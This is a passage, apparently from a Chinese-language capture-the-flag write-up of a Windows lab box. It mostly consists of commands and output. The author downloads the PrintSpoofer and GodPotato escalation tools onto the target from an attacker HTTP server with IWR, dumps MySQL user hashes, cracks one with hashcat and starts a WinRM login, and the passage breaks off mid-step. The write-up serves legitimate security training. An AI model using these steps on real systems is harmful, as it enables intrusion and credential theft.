+</span></span><span style=display:flex><span>    private static $dbName <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;warehouse&#39;</span> ;                                                                                                          
+</span></span><span style=display:flex><span>    private static $dbHost <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;localhost&#39;</span> ;                                                                                                          
+</span></span><span style=display:flex><span>    private static $dbUsername <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;manager&#39;</span>;                                                                                                         
+</span></span><span style=display:flex><span>    private static $dbUserPassword <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;l3tm3!n&#39;</span>;                                                                                                     
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    private static $cont  <span style=color:#f92672>=</span> null;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    public <span style=color:#66d9ef>function</span> __construct<span style=color:#f92672>()</span> <span style=color:#f92672>{</span>
+</span></span><span style=display:flex><span>        die<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;Init function is not allowed&#39;</span><span style=color:#f92672>)</span>;
+</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    public static <span style=color:#66d9ef>function</span> connect<span style=color:#f92672>()</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>{</span>
+</span></span><span style=display:flex><span>       // One connection through whole application
+</span></span><span style=display:flex><span>       <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span> null <span style=color:#f92672>==</span> self::$cont <span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>       <span style=color:#f92672>{</span>     
+</span></span><span style=display:flex><span>        try
+</span></span><span style=display:flex><span>        <span style=color:#f92672>{</span>
+</span></span><span style=display:flex><span>          self::$cont <span style=color:#f92672>=</span>  new PDO<span style=color:#f92672>(</span> <span style=color:#e6db74>&#34;mysql:host=&#34;</span>.self::$dbHost.<span style=color:#e6db74>&#34;;&#34;</span>.<span style=color:#e6db74>&#34;dbname=&#34;</span>.self::$dbName, self::$dbUsername, self::$dbUserPassword<span style=color:#f92672>)</span>; 
+</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
+</span></span><span style=display:flex><span>        catch<span style=color:#f92672>(</span>PDOException $e<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>{</span>
+</span></span><span style=display:flex><span>          die<span style=color:#f92672>(</span>$e-&gt;getMessage<span style=color:#f92672>())</span>; 
+</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
+</span></span><span style=display:flex><span>       <span style=color:#f92672>}</span>
+</span></span><span style=display:flex><span>       <span style=color:#66d9ef>return</span> self::$cont;
+</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
+</span></span><span style=display:flex><span>     
+</span></span><span style=display:flex><span>    public static <span style=color:#66d9ef>function</span> disconnect<span style=color:#f92672>()</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>{</span>
+</span></span><span style=display:flex><span>        self::$cont <span style=color:#f92672>=</span> null;
+</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
+</span></span><span style=display:flex><span>?&gt;
+</span></span></code></pre></div><p>确认系统是 Windows SERVER 2019，内部版本为 17763.805。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>PS C:<span style=color:#ae81ff>\i</span>netpub<span style=color:#ae81ff>\w</span>wwroot&gt; cmd /c ver
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Microsoft Windows <span style=color:#f92672>[</span>Version 10.0.17763.805<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>PS C:<span style=color:#ae81ff>\i</span>netpub<span style=color:#ae81ff>\w</span>wwroot&gt; <span style=color:#f92672>[</span>Environment<span style=color:#f92672>]</span>::OSVersion.Version
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Major  Minor  Build  Revision
+</span></span><span style=display:flex><span>-----  -----  -----  --------
+</span></span><span style=display:flex><span><span style=color:#ae81ff>10</span>     <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>17763</span>  <span style=color:#ae81ff>0</span>       
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>PS C:<span style=color:#ae81ff>\i</span>netpub<span style=color:#ae81ff>\w</span>wwroot&gt; Get-ItemProperty <span style=color:#e6db74>&#39;HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion&#39;</span> | Select-Object ProductName,CurrentBuild,UBR
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>ProductName                  CurrentBuild UBR
+</span></span><span style=display:flex><span>-----------                  ------------ ---
+</span></span><span style=display:flex><span>Windows Server <span style=color:#ae81ff>2019</span> Standard <span style=color:#ae81ff>17763</span>        <span style=color:#ae81ff>805</span>
+</span></span></code></pre></div><p>Spooler 服务在后台运行，可以尝试 PrintSpoofer。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>PS C:<span style=color:#ae81ff>\i</span>netpub<span style=color:#ae81ff>\w</span>wwroot&gt; Get-Service Spooler | Select-Object Name,Status
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Name     Status
+</span></span><span style=display:flex><span>----     ------
+</span></span><span style=display:flex><span>Spooler Running
+</span></span></code></pre></div><p>准备好利用文件。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>┌──<span style=color:#f92672>(</span>kali㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/Work/Tools/PrintSpoofer<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>└─$ ls -liah
+</span></span><span style=display:flex><span>total 36K
+</span></span><span style=display:flex><span><span style=color:#ae81ff>2774909</span> drwxrwxr-x  <span style=color:#ae81ff>2</span> kali kali 4.0K Mar  <span style=color:#ae81ff>2</span>  <span style=color:#ae81ff>2026</span> .
+</span></span><span style=display:flex><span><span style=color:#ae81ff>2490825</span> drwxrwxr-x <span style=color:#ae81ff>41</span> kali kali 4.0K Sep <span style=color:#ae81ff>17</span> 15:22 ..
+</span></span><span style=display:flex><span><span style=color:#ae81ff>2774914</span> -rw-------  <span style=color:#ae81ff>1</span> kali kali  27K Mar  <span style=color:#ae81ff>2</span>  <span style=color:#ae81ff>2026</span> PrintSpoofer64.exe
+</span></span></code></pre></div><p>开启建议服务器。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>┌──<span style=color:#f92672>(</span>kali㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/Work/Tools/PrintSpoofer<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>└─$ goshs  -p <span style=color:#ae81ff>80</span>                                                       
+</span></span><span style=display:flex><span>WARNING<span style=color:#f92672>[</span>2026-10-12 22:38:18<span style=color:#f92672>]</span> Failed to check <span style=color:#66d9ef>for</span> updates: GET https://api.github.com/repos/patrickhener/goshs/releases/latest: <span style=color:#ae81ff>403</span> API rate limit exceeded <span style=color:#66d9ef>for</span> 47.129.47.233. <span style=color:#f92672>(</span>But here<span style=color:#e6db74>&#39;s the good news: Authenticated requests get a higher rate limit. Check out the documentation for more details.) [rate reset in 22m44s] 
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>  __ _  ___  ___| |__  ___ 
+</span></span></span><span style=display:flex><span><span style=color:#e6db74> / _` |/ _ \/ __| &#39;</span>_ <span style=color:#ae81ff>\/</span> __|
+</span></span><span style=display:flex><span>| <span style=color:#f92672>(</span>_| | <span style=color:#f92672>(</span>_<span style=color:#f92672>)</span> <span style=color:#ae81ff>\_</span>_ <span style=color:#ae81ff>\ </span>| | <span style=color:#ae81ff>\_</span>_ <span style=color:#ae81ff>\
+</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span> <span style=color:#ae81ff>\_</span>_, |<span style=color:#ae81ff>\_</span>__/|___/_| |_|___/
+</span></span><span style=display:flex><span>  __/ |                    
+</span></span><span style=display:flex><span> |___/              v2.0.6
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>INFO   <span style=color:#f92672>[</span>2026-10-12 22:38:18<span style=color:#f92672>]</span> Download embedded file at: /example.txt?embedded 
+</span></span><span style=display:flex><span>INFO   <span style=color:#f92672>[</span>2026-10-12 22:38:18<span style=color:#f92672>]</span> Serving on interface br-46cc2717038e bound to 172.18.0.1:80 
+</span></span><span style=display:flex><span>INFO   <span style=color:#f92672>[</span>2026-10-12 22:38:18<span style=color:#f92672>]</span> Serving on interface tun0 bound to 10.10.16.151:80 
+</span></span><span style=display:flex><span>INFO   <span style=color:#f92672>[</span>2026-10-12 22:38:18<span style=color:#f92672>]</span> Serving on interface lo bound to 127.0.0.1:80 
+</span></span><span style=display:flex><span>INFO   <span style=color:#f92672>[</span>2026-10-12 22:38:18<span style=color:#f92672>]</span> Serving on interface eth0 bound to 10.10.10.5:80 
+</span></span><span style=display:flex><span>INFO   <span style=color:#f92672>[</span>2026-10-12 22:38:18<span style=color:#f92672>]</span> Serving on interface docker0 bound to 172.17.0.1:80 
+</span></span><span style=display:flex><span>INFO   <span style=color:#f92672>[</span>2026-10-12 22:38:18<span style=color:#f92672>]</span> Serving HTTP from /home/kali/Work/Tools/PrintSpoofer 
+</span></span><span style=display:flex><span>INFO   <span style=color:#f92672>[</span>2026-10-12 22:38:44<span style=color:#f92672>]</span> 10.129.54.197:49680 - <span style=color:#f92672>[</span>200<span style=color:#f92672>]</span> - <span style=color:#e6db74>&#34;GET /PrintSpoofer64.exe HTTP/1.1&#34;</span>
+</span></span></code></pre></div><p>下载到新建的文件夹下。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>PS C:<span style=color:#ae81ff>\A</span>pps&gt; IWR http://10.10.16.151:80/PrintSpoofer64.exe -OutFile C:<span style=color:#ae81ff>\A</span>pps<span style=color:#ae81ff>\p</span>s.exe -UseBasicParsing
+</span></span><span style=display:flex><span>PS C:<span style=color:#ae81ff>\A</span>pps&gt; dir
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    Directory: C:<span style=color:#ae81ff>\A</span>pps
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Mode                LastWriteTime         Length Name                                                                  
+</span></span><span style=display:flex><span>----                -------------         ------ ----                                                                  
+</span></span><span style=display:flex><span>-a----       10/13/2026   5:45 AM          <span style=color:#ae81ff>27136</span> ps.exe                                                                
+</span></span><span style=display:flex><span>-a----       10/13/2026   5:37 AM             <span style=color:#ae81ff>14</span> test.txt
+</span></span></code></pre></div><p>尝试命令执行，失败了。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>PS C:<span style=color:#ae81ff>\A</span>pps&gt; C:<span style=color:#ae81ff>\A</span>pps<span style=color:#ae81ff>\p</span>s.exe -c <span style=color:#e6db74>&#34;cmd /c whoami&#34;</span>  
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Found privilege: SeImpersonatePrivilege
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Named pipe listening...
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> Operation failed or timed out.
+</span></span></code></pre></div><p>换成 GodPotato 试试。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>PS C:<span style=color:#ae81ff>\A</span>pps&gt; IWR http://10.10.16.151:80/GodPotato-NET4.exe -OutFile C:<span style=color:#ae81ff>\A</span>pps<span style=color:#ae81ff>\g</span>p.exe -UseBasicParsing
+</span></span><span style=display:flex><span>PS C:<span style=color:#ae81ff>\A</span>pps&gt; dir
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    Directory: C:<span style=color:#ae81ff>\A</span>pps
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Mode                LastWriteTime         Length Name                                                                  
+</span></span><span style=display:flex><span>----                -------------         ------ ----                                                                  
+</span></span><span style=display:flex><span>-a----       10/13/2026   4:51 AM          <span style=color:#ae81ff>57344</span> gp.exe                                                                
+</span></span><span style=display:flex><span>-a----       10/13/2026   5:45 AM          <span style=color:#ae81ff>27136</span> ps.exe                                                                
+</span></span><span style=display:flex><span>-a----       10/13/2026   5:37 AM             <span style=color:#ae81ff>14</span> test.txt 
+</span></span></code></pre></div><p>同样失败了。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>PS C:<span style=color:#ae81ff>\A</span>pps&gt; C:<span style=color:#ae81ff>\A</span>pps<span style=color:#ae81ff>\g</span>p.exe -cmd <span style=color:#e6db74>&#34;cmd /c whoami&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> CombaseModule: 0x140736015302656
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> DispatchTable: 0x140736017612000
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> UseProtseqFunction: 0x140736016991328
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> UseProtseqFunctionParamCount: <span style=color:#ae81ff>6</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> HookRPC
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Start PipeServer
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Trigger RPCSS
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> CreateNamedPipe <span style=color:#ae81ff>\\</span>.<span style=color:#ae81ff>\p</span>ipe<span style=color:#ae81ff>\f</span>128ae55-46a9-4313-aee1-b89353f19e5a<span style=color:#ae81ff>\p</span>ipe<span style=color:#ae81ff>\e</span>pmapper
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> DCOM obj GUID: 00000000-0000-0000-c000-000000000046
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> DCOM obj IPID: 0000c802-0424-ffff-b671-d8c82540f19e
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> DCOM obj OXID: 0xc24d822d9ce64c3d
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> DCOM obj OID: 0xc09476c7e9ad440f
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> DCOM obj Flags: 0x281
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> DCOM obj PublicRefs: 0x0
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Marshal Object bytes len: <span style=color:#ae81ff>100</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> UnMarshal Object
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> UnmarshalObject: 0x80070776
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>!<span style=color:#f92672>]</span> Failed to impersonate security context token
+</span></span></code></pre></div><p>回到 SQL 查询，查询数据库，manager 只有 FILE、warehouse 库的全部权限加上 mysql 库的读权限。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>PS C:<span style=color:#ae81ff>\A</span>pps&gt; &amp; <span style=color:#e6db74>&#34;C:\Program Files\MariaDB 10.4\bin\mysql.exe&#34;</span> -u manager -pl3tm3!n -t --connect-timeout<span style=color:#f92672>=</span><span style=color:#ae81ff>5</span> -e <span style=color:#e6db74>&#34;select user(),current_user(); show grants;&#34;</span>
+</span></span><span style=display:flex><span>+-------------------+-------------------+
+</span></span><span style=display:flex><span>| user<span style=color:#f92672>()</span>            | current_user<span style=color:#f92672>()</span>    |
+</span></span><span style=display:flex><span>+-------------------+-------------------+
+</span></span><span style=display:flex><span>| manager@localhost | manager@localhost |
+</span></span><span style=display:flex><span>+-------------------+-------------------+
+</span></span><span style=display:flex><span>+---------------------------------------------------------------------------------------------------------------+
+</span></span><span style=display:flex><span>| Grants <span style=color:#66d9ef>for</span> manager@localhost                                                                                  |
+</span></span><span style=display:flex><span>+---------------------------------------------------------------------------------------------------------------+
+</span></span><span style=display:flex><span>| GRANT FILE ON *.* TO <span style=color:#e6db74>&#39;manager&#39;</span>@<span style=color:#e6db74>&#39;localhost&#39;</span> IDENTIFIED BY PASSWORD <span style=color:#e6db74>&#39;*CFE3EEE434B38CBF709AD67A4DCDEA476CBA7FDA&#39;</span> |
+</span></span><span style=display:flex><span>| GRANT SELECT ON <span style=color:#e6db74>`</span>mysql<span style=color:#e6db74>`</span>.* TO <span style=color:#e6db74>&#39;manager&#39;</span>@<span style=color:#e6db74>&#39;localhost&#39;</span>                                                            |
+</span></span><span style=display:flex><span>| GRANT ALL PRIVILEGES ON <span style=color:#e6db74>`</span>warehouse<span style=color:#e6db74>`</span>.* TO <span style=color:#e6db74>&#39;manager&#39;</span>@<span style=color:#e6db74>&#39;localhost&#39;</span>                                                |
+</span></span><span style=display:flex><span>+---------------------------------------------------------------------------------------------------------------+
+</span></span></code></pre></div><p>列出全部数据库。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>PS C:<span style=color:#ae81ff>\A</span>pps&gt; &amp; <span style=color:#e6db74>&#34;C:\Program Files\MariaDB 10.4\bin\mysql.exe&#34;</span> -u manager -pl3tm3!n -t --connect-timeout<span style=color:#f92672>=</span><span style=color:#ae81ff>5</span> -e <span style=color:#e6db74>&#34;show databases;&#34;</span>
+</span></span><span style=display:flex><span>+--------------------+
+</span></span><span style=display:flex><span>| Database           |
+</span></span><span style=display:flex><span>+--------------------+
+</span></span><span style=display:flex><span>| information_schema |
+</span></span><span style=display:flex><span>| mysql              |
+</span></span><span style=display:flex><span>| warehouse          |
+</span></span><span style=display:flex><span>+--------------------+
+</span></span></code></pre></div><p>读取帐号表，发现 hector 的 hash。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>PS C:<span style=color:#ae81ff>\A</span>pps&gt; &amp; <span style=color:#e6db74>&#34;C:\Program Files\MariaDB 10.4\bin\mysql.exe&#34;</span> -u manager -pl3tm3!n -t --connect-timeout<span style=color:#f92672>=</span><span style=color:#ae81ff>5</span> -e <span style=color:#e6db74>&#34;select user,host,plugin,password,authentication_string from mysql.user;&#34;</span>
+</span></span><span style=display:flex><span>+---------+-----------+-----------------------+-------------------------------------------+-------------------------------------------+
+</span></span><span style=display:flex><span>| User    | Host      | plugin                | Password                                  | authentication_string                     |
+</span></span><span style=display:flex><span>+---------+-----------+-----------------------+-------------------------------------------+-------------------------------------------+
+</span></span><span style=display:flex><span>| root    | localhost | mysql_native_password | *0A4A5CAD344718DC418035A1F4D292BA603134D8 | *0A4A5CAD344718DC418035A1F4D292BA603134D8 |
+</span></span><span style=display:flex><span>| root    | fidelity  | mysql_native_password | *0A4A5CAD344718DC418035A1F4D292BA603134D8 | *0A4A5CAD344718DC418035A1F4D292BA603134D8 |
+</span></span><span style=display:flex><span>| root    | 127.0.0.1 | mysql_native_password | *0A4A5CAD344718DC418035A1F4D292BA603134D8 | *0A4A5CAD344718DC418035A1F4D292BA603134D8 |
+</span></span><span style=display:flex><span>| root    | ::1       | mysql_native_password | *0A4A5CAD344718DC418035A1F4D292BA603134D8 | *0A4A5CAD344718DC418035A1F4D292BA603134D8 |
+</span></span><span style=display:flex><span>| manager | localhost | mysql_native_password | *CFE3EEE434B38CBF709AD67A4DCDEA476CBA7FDA | *CFE3EEE434B38CBF709AD67A4DCDEA476CBA7FDA |
+</span></span><span style=display:flex><span>| hector  | localhost | mysql_native_password | *0E178792E8FC304A2E3133D535D38CAF1DA3CD9D | *0E178792E8FC304A2E3133D535D38CAF1DA3CD9D |
+</span></span><span style=display:flex><span>+---------+-----------+-----------------------+-------------------------------------------+-------------------------------------------+
+</span></span></code></pre></div><p>保存下来。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>┌──<span style=color:#f92672>(</span>kali㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/Work/Kali/Control<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>└─$ cat h.hash
+</span></span><span style=display:flex><span>0E178792E8FC304A2E3133D535D38CAF1DA3CD9D
+</span></span></code></pre></div><p>破解得到 hector 的密码是 <code>l33th4x0rhector</code>。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>┌──<span style=color:#f92672>(</span>kali㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/Work/Kali/Control<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>└─$ hashcat -m <span style=color:#ae81ff>300</span> -a <span style=color:#ae81ff>0</span> h.hash /usr/share/wordlists/rockyou.txt
+</span></span><span style=display:flex><span>hashcat <span style=color:#f92672>(</span>v7.1.2<span style=color:#f92672>)</span> starting
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>OpenCL API <span style=color:#f92672>(</span>OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG<span style=color:#f92672>)</span> - Platform <span style=color:#75715e>#1 [The pocl project]</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>====================================================================================================================================================</span>
+</span></span><span style=display:flex><span>* Device <span style=color:#75715e>#01: cpu-haswell-13th Gen Intel(R) Core(TM) i9-13900HX, 13929/27859 MB (4096 MB allocatable), 8MCU</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Minimum password length supported by kernel: <span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>Maximum password length supported by kernel: <span style=color:#ae81ff>256</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Hashes: <span style=color:#ae81ff>1</span> digests; <span style=color:#ae81ff>1</span> unique digests, <span style=color:#ae81ff>1</span> unique salts
+</span></span><span style=display:flex><span>Bitmaps: <span style=color:#ae81ff>16</span> bits, <span style=color:#ae81ff>65536</span> entries, 0x0000ffff mask, <span style=color:#ae81ff>262144</span> bytes, 5/13 rotates
+</span></span><span style=display:flex><span>Rules: <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Optimizers applied:
+</span></span><span style=display:flex><span>* Zero-Byte
+</span></span><span style=display:flex><span>* Early-Skip
+</span></span><span style=display:flex><span>* Not-Salted
+</span></span><span style=display:flex><span>* Not-Iterated
+</span></span><span style=display:flex><span>* Single-Hash
+</span></span><span style=display:flex><span>* Single-Salt
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>ATTENTION! Pure <span style=color:#f92672>(</span>unoptimized<span style=color:#f92672>)</span> backend kernels selected.
+</span></span><span style=display:flex><span>Pure kernels can crack longer passwords, but drastically reduce performance.
+</span></span><span style=display:flex><span>If you want to switch to optimized kernels, append -O to your commandline.
+</span></span><span style=display:flex><span>See the above message to find out about the exact limits.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Watchdog: Temperature abort trigger set to 90c
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Host memory allocated <span style=color:#66d9ef>for</span> this attack: <span style=color:#ae81ff>514</span> MB <span style=color:#f92672>(</span><span style=color:#ae81ff>27804</span> MB free<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Dictionary cache hit:
+</span></span><span style=display:flex><span>* Filename..: /usr/share/wordlists/rockyou.txt
+</span></span><span style=display:flex><span>* Passwords.: <span style=color:#ae81ff>14344385</span>
+</span></span><span style=display:flex><span>* Bytes.....: <span style=color:#ae81ff>139921507</span>
+</span></span><span style=display:flex><span>* Keyspace..: <span style=color:#ae81ff>14344385</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>0e178792e8fc304a2e3133d535d38caf1da3cd9d:l33th4x0rhector
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Session..........: hashcat
+</span></span><span style=display:flex><span>Status...........: Cracked
+</span></span><span style=display:flex><span>Hash.Mode........: <span style=color:#ae81ff>300</span> <span style=color:#f92672>(</span>MySQL4.1/MySQL5<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>Hash.Target......: 0e178792e8fc304a2e3133d535d38caf1da3cd9d
+</span></span><span style=display:flex><span>Time.Started.....: Mon Oct <span style=color:#ae81ff>12</span> 23:11:31 <span style=color:#ae81ff>2026</span> <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> sec<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>Time.Estimated...: Mon Oct <span style=color:#ae81ff>12</span> 23:11:32 <span style=color:#ae81ff>2026</span> <span style=color:#f92672>(</span><span style=color:#ae81ff>0</span> secs<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>Kernel.Feature...: Pure Kernel <span style=color:#f92672>(</span>password length 0-256 bytes<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>Guess.Base.......: File <span style=color:#f92672>(</span>/usr/share/wordlists/rockyou.txt<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>Guess.Queue......: 1/1 <span style=color:#f92672>(</span>100.00%<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>Speed.#01........:  6994.0 kH/s <span style=color:#f92672>(</span>0.19ms<span style=color:#f92672>)</span> @ Accel:1024 Loops:1 Thr:1 Vec:8
+</span></span><span style=display:flex><span>Recovered........: 1/1 <span style=color:#f92672>(</span>100.00%<span style=color:#f92672>)</span> Digests <span style=color:#f92672>(</span>total<span style=color:#f92672>)</span>, 1/1 <span style=color:#f92672>(</span>100.00%<span style=color:#f92672>)</span> Digests <span style=color:#f92672>(</span>new<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>Progress.........: 6406144/14344385 <span style=color:#f92672>(</span>44.66%<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>Rejected.........: 0/6406144 <span style=color:#f92672>(</span>0.00%<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>Restore.Point....: 6397952/14344385 <span style=color:#f92672>(</span>44.60%<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
+</span></span><span style=display:flex><span>Candidate.Engine.: Device Generator
+</span></span><span style=display:flex><span>Candidates.#01...: la-lily -&gt; l1i4s8a8
+</span></span><span style=display:flex><span>Hardware.Mon.#01.: Util: 31%
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Started: Mon Oct <span style=color:#ae81ff>12</span> 23:11:20 <span style=color:#ae81ff>2026</span>
+</span></span><span style=display:flex><span>Stopped: Mon Oct <span style=color:#ae81ff>12</span> 23:11:33 <span style=color:#ae81ff>2026</span>
+</span></span></code></pre></div><p>用 hector 的口令连本机 WinRM，报错登录会话不存在，用户名里少了机器前缀。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>PS C:<span style=color:#ae81ff>\i</span>netpub<span style=color:#ae81ff>\w</span>wwroot&gt; $p <span style=color:#f92672>=</span> ConvertTo-SecureString <span style=color:#e6db74>&#39;l33th4x0rhector&#39;</span> -AsPlainText -Force
+</span></span><span style=display:flex><span>PS C:<span style=color:#ae81ff>\i</span>netpub<span style=color:#ae81ff>\w</span>wwroot&gt; $c <span style=color:#f92672>=</span> New-Object System.Management.Automation.PSCredential<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;hector&#39;</span>,$p<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>PS C:<span style=color:#ae81ff>\i</span>netpub<span style=color:#ae81ff>\w</span>wwroot&gt; Invoke-Command -ComputerName localhost -Credential $c -ScriptBlock <span style=color:#f92672>{</span> whoami; hostname <span style=color:#f92672>}</span> -ErrorAction Stop
